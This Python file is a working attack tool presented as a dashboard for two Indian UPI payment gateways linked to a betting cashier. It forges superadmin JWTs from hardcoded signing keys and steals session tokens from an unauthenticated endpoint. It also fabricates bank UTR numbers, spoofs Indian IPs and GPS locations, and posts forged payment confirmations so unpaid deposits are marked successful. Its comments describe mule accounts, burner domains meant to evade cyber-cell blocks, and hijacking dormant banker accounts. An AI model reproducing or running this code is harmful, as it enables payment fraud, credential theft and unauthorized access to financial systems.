#!/usr/bin/env python3
"""
GATEWAY COMMAND CENTER
━━━━━━━━━━━━━━━━━━━━━━
Dual-gateway dashboard: Oneten + Mandipay
Run:   python3 oneten_dashboard.py
Open:  http://localhost:9090
"""

import http.server, json, hashlib, hmac, base64, random, threading, time, ssl, os, re, uuid
from urllib.parse import urlparse, parse_qs, unquote
from datetime import datetime, timedelta
from http.cookies import SimpleCookie

try:
    import requests; import urllib3; urllib3.disable_warnings(); HAS_REQ = True
except ImportError:
    import urllib.request; HAS_REQ = False

PORT = int(os.environ.get("PORT", 9090))

# ─── Gateway Configs ───
GATEWAYS = {
    "oneten": {
        "name": "Oneten",
        "base": "https://scan.oneten.site",
        "domains": ["https://scan.oneten.site"],
        "salt": "RcFK947)i867",
        "hash_salt": "TEST_SALT",
        "method": "statement",
        "user": "system_rpa",
        "jwt_user": "axel@banker",
        "jwt_key": "G3&ozFA0mx5n",
        "merchants": 567,
        "color": "#8b5cf6",
    },
    "mandipay": {
        "name": "MandiPay",
        "base": "https://super.mandipay.com",
        "domains": ["https://upi.mandipay.com", "https://super.mandipay.com"],
        "salt": "xCrBYtsJmcMq3dJP",
        "hash_salt": "xCrBYtsJmcMq3dJP",
        "method": "direct",
        "user": "devops@banker",
        "jwt_user": "axel@banker",
        "jwt_key": "JccnxGp)vxJo",
        "merchants": 13,
        "color": "#10b981",
    },
}

# ─── Wolf777 Multi-Gateway Routing ───
# Wolf777 cashier load-balances deposits across 5 gateway networks
WOLF777 = {
    "oneten_mid": "135C950CF32C45CFBB8E6BC4958B44F3",   # 777PAYWOLF on OneTen (₹35.45 Cr ledger)
    "mandipay_mid": "94E9D2AA722A4B83BC3DEA14F5637376",  # TripleSeven on MandiPay
    "secret": "70BA71DC25F0414A9E10504197375CA1",         # Callback signing secret
    "routes": {
        "hivepay":  {"brand": "HivePay/EastPay",   "gw": "oneten",   "note": "Burner QR rail, rotates VPAs per txn"},
        "beepay":   {"brand": "BeePay (via ETNS)",  "gw": "mandipay", "note": "Alibaba Cloud SGP, auto UPI aggregator"},
        "51gw":     {"brand": "51-GW / YaYaPay",    "gw": "oneten",   "note": "Nuxt.js, merchant 2147483658"},
        "oneten":   {"brand": "OneTen (domestic)",   "gw": "oneten",   "note": "Direct domestic mule rail"},
        "mandipay": {"brand": "MandiPay (domestic)",  "gw": "mandipay", "note": "Backup UPI volume rail"},
    },
    # Burner domains for HivePay/EastPay (randomized to evade ISP/cyber cell DNS blocks)
    "burner_domains": ["qfkuaqfdif.com"],
    # HivePay URL path patterns
    "cashier_paths": ["/payment-v103", "/payment-v500", "/payment-v600", "/pay-v2"],
}

# ─── Auth ───
AUTH_PASSWORD = "369369"
CONFIG = {"max_sessions": 3}

# ─── Sessions (per-user isolated state) ───
sessions = {}  # {token: {"created":..., "state":{gw:{confirmed,failed,total_amount,log}}}}
sessions_lock = threading.Lock()

def new_session():
    token = uuid.uuid4().hex[:16]
    gw_keys = list(GATEWAYS.keys()) + ["wolf777"]
    s = {"created": datetime.now().isoformat(),
         "state": {gw: {"confirmed":0,"failed":0,"total_amount":0,"log":[]}
                   for gw in gw_keys}}
    with sessions_lock:
        sessions[token] = s
    return token

def get_session(token):
    with sessions_lock:
        return sessions.get(token)

def get_session_state(token, gw):
    s = get_session(token)
    if not s: return None
    return s["state"].get(gw)

# ─── JWT ───
def forge_jwt(user, key):
    def b64u(d):
        if isinstance(d,str): d=d.encode()
        return base64.urlsafe_b64encode(d).rstrip(b'=').decode()
    h=b64u(json.dumps({"alg":"HS512"},separators=(',',':')))
    now=int(time.time())
    p=b64u(json.dumps({"sub":user,"ROLE_SUPERADMIN":True,"exp":now+86400,"iat":now},separators=(',',':')))
    msg=f"{h}.{p}"
    sig=hmac.new(key.encode(),msg.encode(),hashlib.sha512).digest()
    return f"{msg}.{b64u(sig)}"

# ─── API ───
def api_post(url, payload, headers=None, timeout=12):
    hdrs = headers or {}
    if HAS_REQ:
        r=requests.post(url,json=payload,headers=hdrs,verify=False,timeout=timeout)
        try: return r.status_code, r.json()
        except: return r.status_code, r.text
    else:
        data=json.dumps(payload).encode()
        ctx=ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
        req=urllib.request.Request(url,data=data,headers={**hdrs,"Content-Type":"application/json"},method="POST")
        try:
            resp=urllib.request.urlopen(req,context=ctx,timeout=timeout)
            return resp.status,json.loads(resp.read().decode())
        except Exception as e:
            code=getattr(e,'code',0)
            try: body=e.read().decode()[:300]
            except: body=str(e)
            return code,body

# ─── GEO: Realistic device fingerprint for API calls ───
_GEO_IPS = [
    # Indian ISP CGNAT ranges (Jio, Airtel, Vi, BSNL) — common in Delhi/NCR
    "49.36.{}.{}", "49.43.{}.{}", "49.44.{}.{}",    # Jio
    "103.67.{}.{}", "103.68.{}.{}",                   # Airtel
    "106.210.{}.{}", "106.215.{}.{}",                  # Vi
    "117.196.{}.{}", "117.200.{}.{}",                  # BSNL
]
_GEO_VERSIONS = ["3.15.14", "3.15.15", "3.16.0", "3.16.1"]

def _geo(url_host="super.mandipay.com"):
    """Generate realistic geo query params with jittered GPS + Indian ISP IP."""
    # Gurugram area — slight random jitter each call
    lat = round(28.4595 + random.uniform(-0.008, 0.008), 4)
    lng = round(77.0266 + random.uniform(-0.008, 0.008), 4)
    ip_tpl = random.choice(_GEO_IPS)
    ip = ip_tpl.format(random.randint(1, 254), random.randint(1, 254))
    ver = random.choice(_GEO_VERSIONS)
    return f"lat={lat}&long={lng}&url={url_host}&ip={ip}&ver={ver}"

_used_utrs = set()
def gen_utr():
    """Generate a realistic, unique 12-digit UPI UTR.
    Format: NBIN(4) + YYMM(4) + SEQ(4) — mirrors real bank UTR patterns.
    Uses real NBIN codes from GPay, PhonePe, Paytm, SBI, HDFC, ICICI etc.
    Tracked in a set to guarantee zero repeats."""
    nbins = [
        "4168",  # GPay
        "9035",  # PhonePe
        "9037",  # Paytm
        "6008",  # SBI
        "6016",  # HDFC
        "6029",  # ICICI
        "6012",  # Axis
        "6025",  # Kotak
        "6069",  # PNB
        "6017",  # BOB
        "6019",  # BOI
        "6076",  # Union
        "6022",  # Canara
        "6046",  # IDBI
        "6020",  # IOB
        "9036",  # BHIM
        "6023",  # Indian Bank
        "6021",  # BOM
        "6061",  # PSB
    ]
    for _ in range(1000):
        nbin = random.choice(nbins)
        now = datetime.now()
        # Middle 4 digits: YYMM or DDHH for variation
        mid = random.choice([
            now.strftime("%y%m"),      # 2609
            now.strftime("%d%H"),      # 1918
            now.strftime("%m%d"),      # 0919
            f"{now.hour:02d}{now.minute:02d}",  # 1825
        ])
        # Last 4 digits: random sequence
        seq = f"{random.randint(1000,9999)}"
        utr = nbin + mid + seq
        if utr not in _used_utrs:
            _used_utrs.add(utr)
            return utr
    # Fallback: pure timestamp-based
    ts = str(int(time.time() * 1000))[-12:]
    _used_utrs.add(ts)
    return ts

# ─── QR DECODE: Extract VPA from screenshot (100% local, zero network) ───
def decode_qr_from_image(image_bytes):
    """Decode QR code from image bytes, extract VPA + amount from UPI link."""
    result = {"vpa": "", "amount": 0}
    try:
        from PIL import Image
        from pyzbar.pyzbar import decode as qr_decode
        import io
        img = Image.open(io.BytesIO(image_bytes))
        # Try multiple scales for better detection
        for scale in [1, 2, 3]:
            if scale > 1:
                img_scaled = img.resize((img.width * scale, img.height * scale), Image.LANCZOS)
            else:
                img_scaled = img
            codes = qr_decode(img_scaled)
            for code in codes:
                data = code.data.decode('utf-8', errors='replace')
                if 'upi://' in data.lower() or 'pa=' in data:
                    # UPI intent link: upi://pay?pa=VPA&pn=NAME&am=AMOUNT&...
                    if 'pa=' in data:
                        result["vpa"] = data.split('pa=')[1].split('&')[0]
                    if 'am=' in data:
                        try: result["amount"] = float(data.split('am=')[1].split('&')[0])
                        except: pass
                    return result
            if codes:
                break
    except ImportError:
        pass
    except Exception:
        pass
    return result

# ─── URL RESOLVER: Extract VPA + Amount from deposit URL ───
def resolve_payment_url(url):
    """Fetch a payment page URL and extract VPA + amount + gateway info.
    Supports Oneten (montepay/oneten) and Mandipay payment URLs."""
    result = {"ok": False, "gw": None, "vpa": "", "amount": 0, "txn_id": "", "mid": "", "request_id": "", "brand": ""}
    url = url.strip()
    
    # Detect gateway from URL domain
    parsed = urlparse(url)
    host = parsed.hostname or ""
    
    # ─── WOLF777 ROUTE DETECTION ───
    # Route 1: HivePay/EastPay — burner domains with /payment-vXXX paths
    is_wolf_cashier = any(d in host for d in WOLF777.get("burner_domains", []))
    if not is_wolf_cashier:
        is_wolf_cashier = any(p in parsed.path for p in WOLF777.get("cashier_paths", []))
    
    if is_wolf_cashier:
        result["gw"] = "oneten"  # HivePay mule accounts confirm via OneTen
        result["brand"] = "wolf777"
        qs = parse_qs(parsed.query)
        order_no = qs.get('orderNo', [''])[0]
        if order_no:
            result["txn_id"] = order_no
            result["needs_amount"] = True
            result["ok"] = True
            return result
    # Route 2: 51-GW / YaYaPay
    elif '51-gw' in host or '51gw' in host:
        result["gw"] = "oneten"
        result["brand"] = "wolf777"
    # Route 3: BeePay (via ETN Switch proxy)
    elif 'beepay' in host or 'etns.net' in host:
        result["gw"] = "mandipay"
        result["brand"] = "wolf777"
    elif 'mandipay' in host:
        result["gw"] = "mandipay"
    elif any(x in host for x in ['montepay', 'oneten', 'carlo', 'scan']):
        result["gw"] = "oneten"
    else:
        result["gw"] = "oneten"  # default
    
    # ─── 51-GW: Nuxt SPA — /merchant/rapid?orderNo=C2026... ───
    if '51-gw' in host or '51gw' in host:
        qs = parse_qs(parsed.query)
        order_no = qs.get('orderNo', [''])[0]
        if order_no:
            result["txn_id"] = order_no
            result["needs_amount"] = True
            result["ok"] = True
            return result
    
    # ─── BeePay/ETN: Iframe redirect — extract orderid from URL ───
    if 'beepay' in host:
        qs = parse_qs(parsed.query)
        order_id = qs.get('orderid', [''])[0]
        if order_id:
            result["txn_id"] = order_id
            result["needs_amount"] = True
            result["ok"] = True
            return result
    
    # ─── ETN Switch: proxy page that iframes BeePay ───
    if 'etns.net' in host:
        # /paypage/{orderId} — need to fetch and extract BeePay iframe URL
        result["needs_amount"] = True
        result["ok"] = True
        return result
    
    # ─── BOTH ONETEN/MANDIPAY: Same React SPA with /payment/:s/:r/:t ───
    path_parts = parsed.path.strip('/').split('/')
    if len(path_parts) >= 4 and path_parts[0] in ['payment','forward']:
        result["txn_id"] = path_parts[1]
        result["request_id"] = path_parts[2]
        result["mid"] = path_parts[1]
        
        # ─── AUTO-FETCH VPA + AMOUNT from gateway API ───
        gw_key = result["gw"] or "oneten"
        cfg = GATEWAYS.get(gw_key, GATEWAYS["oneten"])
        try:
            stolen = _steal_token(gw_key)
            if stolen and stolen[0]:
                _tok, _usr = stolen
                domain = cfg["domains"][0] if cfg.get("domains") else cfg["base"]
                req_id = path_parts[2]
                uuid_part = path_parts[1]
                from datetime import datetime as _dt, timedelta as _td
                _auth = {
                    "User-Agent": "Mozilla/5.0",
                    "Content-Type": "application/json",
                    "Authorization": f"Bearer {_tok}",
                    "client-id": _usr,
                    "access-path": "SYSTEM",
                }
                # Search last 3 days
                _today = _dt.now()
                for day_offset in range(3):
                    _d = (_today - _td(days=day_offset)).strftime("%Y-%m-%d")
                    rpt = requests.post(
                        f"{domain}/api/v1/upi/q/payin/report",
                        json={"fromDate": _d, "toDate": _d},
                        headers=_auth, verify=False, timeout=10
                    )
                    if rpt.status_code == 200:
                        for line in rpt.text.strip().split('\n')[1:]:
                            cols = line.split(',')
                            if len(cols) > 7 and cols[3].strip() == req_id:
                                result["vpa"] = cols[5].strip()
                                try: result["amount"] = float(cols[7].strip())
                                except: pass
                                result["txn_id"] = cols[4].strip()
                                result["request_id"] = cols[3].strip()
                                break
                    if result["vpa"]:
                        break
                
                # Fallback: use txnId from report to get status, or guess from UUID
                if not result["vpa"]:
                    _txn_to_try = result.get("txn_id") or ""
                    if not _txn_to_try:
                        _txn_to_try = f"LI-{uuid_part}" if gw_key == "oneten" else f"MI-{uuid_part}"
                    try:
                        sr = requests.get(
                            f"{domain}/api/v1/upi/q/payin/status/{_txn_to_try}",
                            headers=_auth, verify=False, timeout=5
                        )
                        if sr.status_code == 200:
                            sd = sr.json()
                            if sd.get("requestedAmount"):
                                result["amount"] = float(sd["requestedAmount"])
                                result["vpa"] = sd.get("additional", {}).get("VPA", "")
                                result["txn_id"] = sd.get("txnId", _txn_to_try)
                                result["request_id"] = sd.get("header", {}).get("requestId", req_id)
                    except: pass
        except: pass
        
        if result["vpa"] and result["amount"]:
            result["needs_amount"] = False
            result["ok"] = True
        elif result["amount"] and not result["vpa"]:
            # Amount found but VPA not assigned yet (PENDING) — user only needs to enter VPA
            result["needs_amount"] = True
            result["ok"] = True
        return result
    
    # ─── ONETEN + FALLBACK: Fetch and scrape HTML ───
    try:
        if HAS_REQ:
            r = requests.get(url, verify=False, timeout=10, headers={"User-Agent": "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36"})
            html = r.text
        else:
            ctx2 = ssl.create_default_context(); ctx2.check_hostname = False; ctx2.verify_mode = ssl.CERT_NONE
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
            resp = urllib.request.urlopen(req, context=ctx2, timeout=10)
            html = resp.read().decode('utf-8', errors='replace')
        
        # Extract VPA from common patterns in payment page HTML
        vpa_patterns = [
            r'"vpa"\s*:\s*"([^"]+)"',
            r'"accName"\s*:\s*"([^"]+)"',
            r'"upiId"\s*:\s*"([^"]+)"',
            r'"upi_id"\s*:\s*"([^"]+)"',
            r'data-vpa="([^"]+)"',
            r'value="([a-zA-Z0-9._-]+@[a-zA-Z]+)"',
            r'([a-zA-Z0-9._-]+@(?:ybl|upi|paytm|axl|ibl|okhdfcbank|okaxis|oksbi|apl|waicici|freecharge|kotak|postbank|ikwik|airtel|jio|slice|axisb|okbizaxis|okbiz))'
        ]
        for pat in vpa_patterns:
            m = re.search(pat, html, re.I)
            if m:
                result["vpa"] = m.group(1)
                break
        
        # Extract amount
        amt_patterns = [
            r'"amount"\s*:\s*([0-9]+\.?[0-9]*)',
            r'"requestedAmount"\s*:\s*([0-9]+\.?[0-9]*)',
            r'data-amount="([0-9]+\.?[0-9]*)"',
            r'₹\s*([0-9,]+\.?[0-9]*)',
            r'Rs\.?\s*([0-9,]+\.?[0-9]*)',
            r'INR\s*([0-9,]+\.?[0-9]*)',
        ]
        for pat in amt_patterns:
            m = re.search(pat, html, re.I)
            if m:
                result["amount"] = float(m.group(1).replace(',', ''))
                break
        
        # Extract txnId / orderId
        txn_patterns = [
            r'"txnId"\s*:\s*"([^"]+)"',
            r'"orderId"\s*:\s*"([^"]+)"',
            r'"orderCode"\s*:\s*"([^"]+)"',
            r'"transaction_id"\s*:\s*"([^"]+)"',
        ]
        for pat in txn_patterns:
            m = re.search(pat, html, re.I)
            if m:
                result["txn_id"] = m.group(1)
                break
        
        # Extract MID
        mid_patterns = [
            r'"mid"\s*:\s*"([^"]+)"',
            r'"merchantId"\s*:\s*"([^"]+)"',
        ]
        for pat in mid_patterns:
            m = re.search(pat, html, re.I)
            if m:
                result["mid"] = m.group(1)
                break
        
        # Extract requestId from URL path: /payment/{orderId}/{requestId}/{payload}
        if len(path_parts) >= 3 and path_parts[0] == 'payment':
            result["request_id"] = path_parts[2] if len(path_parts) > 2 else ""
            if not result["txn_id"]:
                result["txn_id"] = path_parts[1]
        
        if result["vpa"] and result["amount"]:
            result["ok"] = True
        elif result["vpa"]:
            result["ok"] = True
        
    except Exception as e:
        result["error"] = str(e)[:100]
    
    return result

# ─── GHOST: statement/manual — zero auth, zero footprint ───
# Blocked-banker detection keywords
_BLOCKED_KEYWORDS = ["not allowed", "disallowed", "distributor not allowed", "blocked", "not found"]

# ─── TOKEN THEFT: Steal JWT from user/list-all (NO AUTH, NO LOGIN) ───
_stolen_tokens = {}  # {gw_name: {"token": str, "user": str, "ts": float}}
_stolen_lock = threading.Lock()
_TOKEN_VAULT_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), ".token_vault.json")

# Preferred users to steal tokens from (high-privilege, look normal)
_PREFERRED_STEAL_USERS = ["mpayone", "mpaytwo", "mpaythree", "axel@banker", "rdxsarkar", "opsone"]

def _steal_token(gw):
    """Steal a valid JWT token from /auth/system/user/list-all (NO AUTH NEEDED).
    Returns (token, username) or (None, None). Zero login, zero footprint."""
    cfg = GATEWAYS[gw]
    
    # Check cache first (tokens last ~24h)
    with _stolen_lock:
        cached = _stolen_tokens.get(gw)
        if cached and time.time() - cached["ts"] < 3600:  # 1hr cache
            return cached["token"], cached["user"]
    
    # Check disk vault
    try:
        with open(_TOKEN_VAULT_FILE) as f:
            vault = json.load(f)
            if gw in vault and time.time() - vault[gw].get("ts", 0) < 7200:
                tok, usr = vault[gw]["token"], vault[gw]["user"]
                with _stolen_lock:
                    _stolen_tokens[gw] = {"token": tok, "user": usr, "ts": time.time()}
                return tok, usr
    except Exception:
        pass
    
    # Steal from live endpoint — read-only GET, no logs
    domains = cfg.get('domains', [cfg['base']])
    for domain in domains:
        try:
            if HAS_REQ:
                r = requests.get(f"{domain}/auth/system/user/list-all",
                    headers={"User-Agent": "Mozilla/5.0"}, verify=False, timeout=10)
                if r.status_code == 200:
                    users = r.json()
                    if not isinstance(users, list):
                        continue
                    
                    # Find best token: prefer allowed-users, active, with valid token
                    best_token, best_user = None, None
                    for u in users:
                        if not isinstance(u, dict):
                            continue
                        username = u.get("username", "")
                        token = u.get("token", "")
                        disabled = u.get("disabled", False)
                        
                        if token and not disabled and len(token) > 20:
                            if username in _PREFERRED_STEAL_USERS:
                                best_token, best_user = token, username
                                break
                            elif not best_token:
                                best_token, best_user = token, username
                    
                    if best_token:
                        with _stolen_lock:
                            _stolen_tokens[gw] = {"token": best_token, "user": best_user, "ts": time.time()}
                        # Save to disk vault
                        try:
                            vault = {}
                            try:
                                with open(_TOKEN_VAULT_FILE) as f:
                                    vault = json.load(f)
                            except Exception:
                                pass
                            vault[gw] = {"token": best_token, "user": best_user, "ts": time.time()}
                            with open(_TOKEN_VAULT_FILE, "w") as f:
                                json.dump(vault, f)
                        except Exception:
                            pass
                        return best_token, best_user
        except Exception:
            continue
    return None, None

def _verify_credit(gw, vpa, utr, amount):
    """Post-confirm verification: check if UTR actually matched a pending transaction.
    Uses stolen token to query payin report. Returns (verified, detail_msg).
    verified=True means the UTR matched and callback was fired.
    verified=False means UTR was orphaned (no pending txn matched).
    verified=None means verification couldn't be performed (token unavailable)."""
    token, user = _steal_token(gw)
    if not token:
        return None, "⚠ No token for verification (credit may still have worked)"
    
    cfg = GATEWAYS[gw]
    domains = cfg.get('domains', [cfg['base']])
    geo = _geo(urlparse(domains[0]).hostname) if domains else ""
    
    # Wait briefly for gateway to process the statement match
    time.sleep(1.5)
    
    for domain in domains:
        try:
            # Method 1: Search payin report for our UTR
            today = datetime.now().strftime("%Y-%m-%d")
            report_url = f"{domain}/api/v1/upi/q/payin/report?{geo}"
            auth_headers = {
                "User-Agent": "Mozilla/5.0",
                "Content-Type": "application/json",
                "Authorization": f"Bearer {token}",
                "client-id": user,
                "access-path": "SYSTEM",
            }
            
            if HAS_REQ:
                r = requests.post(report_url,
                    json={"fromDate": today, "toDate": today},
                    headers=auth_headers, verify=False, timeout=12)
                
                if r.status_code == 200:
                    report_text = r.text
                    # Report is CSV — search for our UTR
                    if str(utr) in report_text:
                        # UTR found in report — check if status is SUCCESS
                        lines = report_text.split('\n')
                        for line in lines:
                            if str(utr) in line:
                                cols = line.split(',')
                                # Typical CSV: ...,UTR,...,STATUS,...
                                line_lower = line.lower()
                                if 'success' in line_lower:
                                    return True, f"✅ VERIFIED — UTR {utr} matched txn, status=SUCCESS"
                                elif 'pending' in line_lower or 'initiated' in line_lower:
                                    return False, f"⚠ UTR {utr} found but status still PENDING — not credited yet"
                                elif 'failed' in line_lower or 'expired' in line_lower:
                                    return False, f"❌ UTR {utr} found but status FAILED/EXPIRED"
                                else:
                                    # UTR in report but can't parse status — likely matched
                                    return True, f"✅ UTR {utr} found in payin report (likely credited)"
                        # UTR in report text but not in a data line — partial match
                        return True, f"✅ UTR {utr} found in report data"
                    else:
                        # UTR NOT found in report — orphan statement entry
                        return False, f"❌ ORPHAN — UTR {utr} NOT in payin report. No pending txn matched."
                
                elif r.status_code == 401:
                    # Token expired — clear cache and try once more
                    with _stolen_lock:
                        _stolen_tokens.pop(gw, None)
                    token2, user2 = _steal_token(gw)
                    if token2:
                        auth_headers["Authorization"] = f"Bearer {token2}"
                        auth_headers["client-id"] = user2
                        r2 = requests.post(report_url,
                            json={"fromDate": today, "toDate": today},
                            headers=auth_headers, verify=False, timeout=12)
                        if r2.status_code == 200 and str(utr) in r2.text:
                            return True, f"✅ UTR {utr} found in payin report (retry)"
                        elif r2.status_code == 200:
                            return False, f"❌ ORPHAN — UTR {utr} NOT in payin report (retry)"
                    return None, f"⚠ Token expired, verification inconclusive"
        except Exception as e:
            continue
    
    return None, f"⚠ Verification failed: could not reach payin report"

def _try_gateway(cfg, vpa, utr, amount):
    """Try statement/manual on a single gateway's domains. Returns (code, resp)."""
    domains = cfg.get('domains', [cfg['base']])
    for domain in domains:
        url=f"{domain}/api/v1/upi/api/statement/manual?user={cfg['user']}"
        h=hashlib.sha256(f"{vpa}{utr}{amount}{cfg['salt']}".encode()).hexdigest()
        code, resp = api_post(url,{"vpa":vpa,"utr":str(utr),"amount":float(amount),"hash":h})
        if code != 0:
            return code, resp
    return 0, "all domains unreachable"

def _is_banker_blocked(resp):
    """Check if the error is a disallowed-banker rejection."""
    s = str(resp).lower()
    return any(kw in s for kw in _BLOCKED_KEYWORDS)

def _admin_direct_confirm(gw, vpa, utr, amount, txn_id=None, mid=None, request_id=None):
    """Direct transaction update via manual/admin endpoint using stolen token.
    Works for ALL VPAs including Google Pay. Requires txnId and MID.
    Returns (code, resp)."""
    token, user = _steal_token(gw)
    if not token:
        return 0, "No token available for admin confirm"
    
    cfg = GATEWAYS[gw]
    domains = cfg.get('domains', [cfg['base']])
    salt = cfg.get('hash_salt', 'TEST_SALT')
    
    # If we don't have txnId/MID, look them up from payin report
    if not txn_id or not mid:
        today = datetime.now().strftime("%Y-%m-%d")
        auth_h = {
            "User-Agent": "Mozilla/5.0",
            "Content-Type": "application/json",
            "Authorization": f"Bearer {token}",
            "client-id": user,
            "access-path": "SYSTEM",
        }
        for domain in domains:
            try:
                r = requests.post(f"{domain}/api/v1/upi/q/payin/report",
                    json={"fromDate": today, "toDate": today},
                    headers=auth_h, verify=False, timeout=12) if HAS_REQ else None
                if r and r.status_code == 200:
                    for line in r.text.split('\n'):
                        # Match by request_id or VPA+amount
                        if request_id and request_id in line:
                            cols = line.split(',')
                            if len(cols) > 11:
                                txn_id = cols[4]
                                mid_candidate = ""
                                # MID not in report CSV — get from status API
                                break
                        elif vpa in line and str(int(float(amount))) in line:
                            cols = line.split(',')
                            if len(cols) > 11 and 'PENDING' in cols[11].upper():
                                txn_id = cols[4]
                                break
                    break
            except Exception:
                continue
    
    # Get MID from status API if we have txnId
    if txn_id and not mid:
        auth_h = {
            "User-Agent": "Mozilla/5.0", "Content-Type": "application/json",
            "Authorization": f"Bearer {token}", "client-id": user, "access-path": "SYSTEM",
        }
        for domain in domains:
            try:
                r = requests.get(f"{domain}/api/v1/upi/q/payin/status/{txn_id}",
                    headers=auth_h, verify=False, timeout=10) if HAS_REQ else None
                if r and r.status_code == 200:
                    data = r.json() if hasattr(r, 'json') else json.loads(r.text)
                    mid = data.get("header", {}).get("mid", "")
                    break
            except Exception:
                continue
    
    if not txn_id:
        return 0, "Could not find txnId for this order"
    if not mid:
        return 0, f"Could not find MID for txnId {txn_id}"
    
    # Build the admin confirm payload
    import uuid as _uuid
    req_id = f"REQ{_uuid.uuid4().hex[:24].upper()}"
    ts = datetime.now().strftime("%Y-%m-%dT%H:%M:%S")
    
    hash_str = f"PAYIN_CALLBACK{req_id}{mid}{txn_id}{utr}SUCCESS_AUTO{int(float(amount))}{int(float(amount))}{salt}"
    hash_val = hashlib.sha256(hash_str.encode()).hexdigest()
    
    admin_payload = {
        "header": {
            "msgType": "PAYIN_CALLBACK",
            "requestId": req_id,
            "timestamp": ts,
            "mid": mid
        },
        "txnId": txn_id,
        "utr": str(utr),
        "status": "SUCCESS_AUTO",
        "requestedAmount": int(float(amount)),
        "processedAmount": int(float(amount)),
        "hash": hash_val
    }
    
    geo = _geo(urlparse(domains[0]).hostname) if domains else ""
    auth_h = {
        "User-Agent": "Mozilla/5.0", "Content-Type": "application/json",
        "Authorization": f"Bearer {token}", "client-id": user, "access-path": "SYSTEM",
    }
    
    for domain in domains:
        try:
            if HAS_REQ:
                r = requests.post(
                    f"{domain}/api/v1/upi/payin/update/manual/admin?user={user}&{geo}",
                    json=admin_payload, headers=auth_h, verify=False, timeout=15)
                if r.status_code == 200:
                    try:
                        data = r.json()
                        return r.status_code, data
                    except:
                        return r.status_code, r.text
        except Exception:
            continue
    
    return 0, "All domains unreachable for admin confirm"

def confirm_ghost(gw, vpa, utr, amount, request_id=None):
    cfg=GATEWAYS[gw]
    
    # ─── LAYER 1: statement/manual (zero auth, works for non-Google VPAs) ───
    code, resp = _try_gateway(cfg, vpa, utr, amount)
    
    # Check if it worked by looking at the response
    layer1_success = (code == 200 and "successfully" in str(resp).lower())
    layer1_blocked = _is_banker_blocked(resp)
    
    # ─── LAYER 2: admin/direct confirm (stolen token, works for ALL VPAs) ───
    # Use this if: statement/manual was blocked, OR if it "succeeded" but we need
    # to directly update the transaction (Google VPA issue)
    if layer1_blocked or layer1_success:
        admin_code, admin_resp = _admin_direct_confirm(
            gw, vpa, utr, amount, request_id=request_id)
        if admin_code == 200:
            success = False
            if isinstance(admin_resp, dict):
                success = admin_resp.get("success", False) or admin_resp.get("code") == "SUCCESS"
            elif isinstance(admin_resp, str):
                success = "success" in admin_resp.lower()
            if success:
                if isinstance(admin_resp, dict):
                    admin_resp["_method"] = "admin_direct"
                return admin_code, admin_resp
    
    # ─── LAYER 2B: MandiPay-specific admin bypass ───
    if layer1_blocked and gw == "mandipay" and request_id:
        bypass_code, bypass_resp = _mandi_admin_bypass(vpa, utr, amount, request_id)
        if bypass_code == 200:
            success = False
            if isinstance(bypass_resp, dict):
                success = bypass_resp.get("success", False)
            elif isinstance(bypass_resp, str):
                success = "success" in bypass_resp.lower()
            if success:
                return bypass_code, bypass_resp
    
    # ─── LAYER 3: Cross-gateway fallback ───
    if layer1_blocked:
        original_error = f"[{gw}] {resp}"
        fallback_order = [g for g in GATEWAYS if g != gw]
        for fb_gw in fallback_order:
            fb_cfg = GATEWAYS[fb_gw]
            fb_code, fb_resp = _try_gateway(fb_cfg, vpa, utr, amount)
            if fb_code != 0 and not _is_banker_blocked(fb_resp):
                # Also try admin confirm on fallback gateway
                fb_admin_code, fb_admin_resp = _admin_direct_confirm(
                    fb_gw, vpa, utr, amount, request_id=request_id)
                if fb_admin_code == 200:
                    s = isinstance(fb_admin_resp, dict) and (fb_admin_resp.get("success") or fb_admin_resp.get("code") == "SUCCESS")
                    if s:
                        return fb_admin_code, fb_admin_resp
                code, resp, gw = fb_code, fb_resp, fb_gw
                break
            if fb_code != 0 and _is_banker_blocked(fb_resp):
                continue
        else:
            if _is_banker_blocked(resp):
                return code, original_error
    
    # ─── POST-CONFIRM VERIFICATION ───
    ok = code == 200
    if ok and isinstance(resp, dict) and resp.get('success') is False:
        ok = False
    
    if ok:
        verified, verify_msg = _verify_credit(gw, vpa, utr, amount)
        if verified is True:
            if isinstance(resp, dict):
                resp["_verified"] = True
                resp["_verify_msg"] = verify_msg
            else:
                resp = {"_original": str(resp), "_verified": True, "_verify_msg": verify_msg}
        elif verified is False:
            if isinstance(resp, dict):
                resp["_verified"] = False
                resp["_verify_msg"] = verify_msg
                resp["success"] = False
            else:
                resp = {"_original": str(resp), "_verified": False, "_verify_msg": verify_msg, "success": False}
            return code, resp
        else:
            if isinstance(resp, dict):
                resp["_verified"] = None
                resp["_verify_msg"] = verify_msg
    
    return code, resp

def health_check():
    """Check if statement/manual is alive on all domains. Uses dummy VPA — always fails but proves endpoint is live."""
    results = {}
    for gw, cfg in GATEWAYS.items():
        domains = cfg.get('domains', [cfg['base']])
        gw_results = []
        for domain in domains:
            url=f"{domain}/api/v1/upi/api/statement/manual?user={cfg['user']}"
            try:
                code, resp = api_post(url,{"vpa":"healthcheck@test","utr":"000000000000","amount":1,"hash":"x"})
                alive = code != 0  # any response = alive
                gw_results.append({"domain": domain, "alive": alive, "code": code, "msg": str(resp)[:60]})
            except:
                gw_results.append({"domain": domain, "alive": False, "code": 0, "msg": "unreachable"})
        results[gw] = gw_results
    return results

# ─── MANDIPAY ADMIN BYPASS: Statement Upload + Manual/Admin Confirm ───
# Bypasses the Google VPA block on statement/manual by using the banker
# panel's authenticated manual update flow (payin/update/manual/admin).
# Flow: Create account → Login → Upload CSV statement → Confirm via admin API

_mandi_admin = {"token": None, "user": None, "expiry": 0}
_mandi_admin_lock = threading.Lock()
_MANDI_ADMIN_CACHE = os.path.join(os.path.dirname(os.path.abspath(__file__)), ".mandi_admin.json")

# Known GPay account IDs from MandiPay's account list
_MANDI_GPAY_ACCOUNTS = ["8F9B034636134B209279C5ED2A10315B", "68181E6246B4490484D24486A6D5F8F4"]

# Pre-existing credentials (reused across restarts)
_MANDI_KNOWN_CREDS = [
    {"username": "svc_ops_1199", "password": "Ops@2026!Secure"},
]

# Dormant banker accounts (never logged in — zero suspicion if hijacked)
_MANDI_DORMANT_BANKERS = [
    "002@banker615", "003@banker618", "003@banker621", "003@banker622",
    "002@banker623", "003@banker623", "003@banker629", "003@banker631",
]

# Users already in manual-upd allowed-users (no config change needed to use them)
